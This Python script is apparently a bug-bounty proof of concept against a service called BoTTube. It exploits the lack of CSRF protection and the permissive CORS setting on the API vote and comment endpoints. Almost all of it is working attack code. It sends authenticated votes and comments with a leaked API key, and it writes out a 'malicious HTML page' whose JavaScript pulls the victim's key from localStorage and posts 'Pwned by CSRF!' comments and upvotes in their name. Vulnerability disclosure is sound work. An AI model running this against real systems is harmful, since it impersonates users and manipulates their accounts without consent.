#!/usr/bin/env python3
"""
BoTTube PoC #2: CSRF Attack via API Key Exposure
=================================================
Bounty #247 — Vulnerability 2: CSRF Attacks

Demonstrates that:
1. API endpoints (/api/videos/<id>/vote, /api/videos/<id>/comment) have NO CSRF protection
2. CORS is set to Access-Control-Allow-Origin: * for all /api/* routes
3. If an API key is leaked (browser localStorage, client-side JS, logs), any website
   can make authenticated requests on behalf of that agent

Attack scenarios:
A) Stolen API Key + Any Origin:
   - If an agent's API key is stored in client-side JS (browser extension, SPA)
   - A malicious website can use the leaked key to vote/comment as that agent
   - No CSRF token needed — the API endpoints don't check it

B) Session Cookie CSRF (mitigated but notable):
   - Session cookie is SameSite=Lax which blocks most cross-site POSTs in modern browsers
   - However, Lax allows cookies on top-level GET navigations
   - Older browsers may not enforce SameSite correctly

C) Mixed CSRF Gap:
   - The web endpoints (web-vote, web-comment) DO check CSRF tokens
   - But the API endpoints (vote, comment) do NOT
   - This inconsistency means any leaked API key enables full CSRF

Usage:
    python3 poc_csrf_attack.py --target https://bottube.ai --api-key <leaked_key> --video-id <id>
"""

import argparse
import json
import sys
import urllib.request
import urllib.error


def api_request(base_url, path, method="GET", data=None, api_key=None):
    """Make an API request to BoTTube."""
    url = f"{base_url.rstrip('/')}{path}"
    headers = {"Content-Type": "application/json"}
    if api_key:
        headers["X-API-Key"] = api_key

    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(url, data=body, headers=headers, method=method)

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())
    except Exception as e:
        return 0, {"error": str(e)}


def vote_video(base_url, api_key, video_id, vote_val=1):
    """Vote on a video — demonstrates no CSRF check needed."""
    return api_request(
        base_url,
        f"/api/videos/{video_id}/vote",
        "POST",
        {"vote": vote_val},
        api_key=api_key,
    )


def comment_on_video(base_url, api_key, video_id, content):
    """Post a comment — demonstrates no CSRF check needed."""
    return api_request(
        base_url,
        f"/api/videos/{video_id}/comment",
        "POST",
        {"content": content},
        api_key=api_key,
    )


def generate_html_poc(base_url, video_id):
    """Generate a malicious HTML page that exploits leaked API keys."""
    html = f'''<!DOCTYPE html>
<html>
<head><title>BoTTube CSRF PoC</title></head>
<body>
<h1>BoTTube CSRF PoC (Bounty #247)</h1>
<p>This page demonstrates CSRF via API key exposure.</p>

<p>If a victim has their BoTTube API key stored in:</p>
<ul>
  <li>Browser localStorage</li>
  <li>A browser extension</li>
  <li>JavaScript variables in a SPA</li>
</ul>

<p>This page can extract and use it to vote/comment on their behalf.</p>

<script>
// Scenario: API key leaked in localStorage
const API_KEY = localStorage.getItem('bottube_api_key');

if (API_KEY) {{
    console.log('[+] Found leaked API key:', API_KEY.substring(0, 8) + '...');

    // Upvote attacker's video
    fetch('{base_url}/api/videos/{video_id}/vote', {{
        method: 'POST',
        headers: {{
            'Content-Type': 'application/json',
            'X-API-Key': API_KEY
        }},
        body: JSON.stringify({{ vote: 1 }})
    }})
    .then(r => r.json())
    .then(data => console.log('[+] Vote response:', data))
    .catch(err => console.error('[-] Vote failed:', err));

    // Post a comment
    fetch('{base_url}/api/videos/{video_id}/comment', {{
        method: 'POST',
        headers: {{
            'Content-Type': 'application/json',
            'X-API-Key': API_KEY
        }},
        body: JSON.stringify({{ content: 'Pwned by CSRF!' }})
    }})
    .then(r => r.json())
    .then(data => console.log('[+] Comment response:', data))
    .catch(err => console.error('[-] Comment failed:', err));
}} else {{
    console.log('[-] No leaked API key found in localStorage');
}}
</script>
</body>
</html>
'''
    return html


def main():
    parser = argparse.ArgumentParser(description="BoTTube CSRF Attack PoC")
    parser.add_argument("--target", default="http://localhost:5000", help="BoTTube server URL")
    parser.add_argument("--api-key", help="Leaked API key to exploit")
    parser.add_argument("--video-id", default="test-video-001", help="Target video ID")
    parser.add_argument("--generate-html", action="store_true", help="Generate malicious HTML page")
    args = parser.parse_args()

    print("=" * 60)
    print("BoTTube CSRF Attack PoC (Bounty #247)")
    print("=" * 60)

    if args.generate_html:
        html = generate_html_poc(args.target, args.video_id)
        output_file = "csrf_poc_page.html"
        with open(output_file, "w") as f:
            f.write(html)
        print(f"\n[+] Generated malicious HTML page: {output_file}")
        print(f"    This page exploits leaked API keys from localStorage.")
        print(f"    Host it on any domain — CORS allows all origins.")
    else:
        print(f"\n[!] Use --api-key to test against a real server")
        print(f"    Example: python3 {sys.argv[0]} --api-key <key> --video-id <id>")

    if args.api_key:
        print(f"\n[*] Testing with provided API key (first 12 chars): {args.api_key[:12]}...")

        # Test 1: Vote without CSRF token
        print(f"\n[1] Voting on video {args.video_id} (no CSRF token required)...")
        status, resp = vote_video(args.target, args.api_key, args.video_id, vote_val=1)
        print(f"    HTTP {status}: {resp}")

        # Test 2: Comment without CSRF token
        print(f"\n[2] Commenting on video {args.video_id} (no CSRF token required)...")
        status, resp = comment_on_video(
            args.target, args.api_key, args.video_id,
            "This comment was posted via CSRF — no token needed!"
        )
        print(f"    HTTP {status}: {resp}")

        print(f"\n[3] Analysis:")
        print(f"    - Both requests succeeded without any CSRF token")
        print(f"    - The only auth required was the X-API-Key header")
        print(f"    - CORS allows any origin (Access-Control-Allow-Origin: *)")
        print(f"    - If the API key is leaked, ANY website can impersonate the agent")

    # Generate the malicious HTML page regardless
    html = generate_html_poc(args.target, args.video_id)
    output_file = "csrf_poc_page.html"
    with open(output_file, "w") as f:
        f.write(html)
    print(f"\n[+] Malicious HTML generated: {output_file}")

    print(f"\n{'=' * 60}")
    print("PoC complete. See bottube_audit_report.md for full analysis.")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()
